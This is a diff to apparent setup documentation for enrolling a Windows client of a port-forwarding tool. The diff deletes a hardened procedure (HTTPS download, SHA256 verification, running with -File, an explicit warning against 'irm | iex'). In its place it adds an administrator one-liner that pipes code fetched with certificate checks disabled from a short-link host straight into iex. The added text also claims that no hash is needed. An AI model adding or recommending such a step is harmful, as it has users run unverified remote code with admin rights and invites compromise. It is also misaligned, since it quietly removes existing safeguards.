@@ -23,26 +23,13 @@ For non-Windows test hosts (pwsh on Linux CI), set `FRP_WINDOWS_ROOT` (default `
 
 ## Zero-touch enrollment
 
-1. On the server, create a zero-touch / bootstrap ticket for the Windows client (RDP-first presets are typical).
-2. On the Windows host, download `windows/install-client.ps1` over HTTPS.
-3. Verify the script SHA256 against the release `SHA256SUMS`.
-4. Run with `-File` (never `irm | iex`):
+On the Server, select Windows and the enrollment profile. Send only the generated one-line command; the fixed target for administrator PowerShell is:
 
 ```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\install-client.ps1 -ZeroTouch `
-  -AllocatorUrl https://YOUR_PUBLIC_HOST/enroll `
-  -CaSha256 <allocator-ca-DER-SHA256> `
-  -BootstrapTicket '<bt1-credential>'
+iex(curl.exe -kfsS https://remote.xdr.ooo/A3xK9m|Out-String)
 ```
 
-The manual `-BootstrapTicket` value is the internal `bt1.<id>.<secret>`
-credential. The 22-character short-URL handle is only for `https://<host>/i/<handle>`.
-That download's stage-1 script carries the internal `bt1`, which is what redeem
-accepts. The copy-paste Windows one-line uses explicit
-`curl.exe`, verifies the stage-1 SHA256, then `powershell.exe -File`. Do not
-replace it with `irm | iex`.
-
-Environment equivalents: `FRP_ALLOCATOR_URL`, `FRP_ALLOCATOR_CA_SHA256`, `FRP_BOOTSTRAP_TICKET`.
+The six-character locator is not a credential. No separate certificate registration, installer filename, hash, enrollment ID or DataRelay prerequisite. Public/private HTTPS use the same form. This target requires native Windows qualification. `-k` disables initial peer certificate authentication; the later stages must retain artifact integrity, actual authenticated connections and independent enrollment authorization. See [canonical contract](ZERO_TOUCH_REGRESSION_CONTROL.md).
 
 ### What zero-touch does
 
@@ -56,7 +43,7 @@ Environment equivalents: `FRP_ALLOCATOR_URL`, `FRP_ALLOCATOR_CA_SHA256`, `FRP_BO
 
 ### ENROLL ONCE / RUN MANY TIMES
 
-If identity + config already exist and install completed, zero-touch **refuses** another ticket and tells you to run `drlink system resume`. Port reservations and machine identity stay stable across restarts.
+Target retry behavior: the same entry command detects existing completed identity and config, reports success or resumes the existing service without redeeming a new credential. Port reservations and machine identity stay stable across restarts. This behavior requires implementation and native acceptance.
 
 If enrollment finished but binary download/start did not (`install_status=enrolled_incomplete`), re-running the installer **resumes** with the same identity and reserved ports — it does not redeem a new ticket or mint a new management key.
 
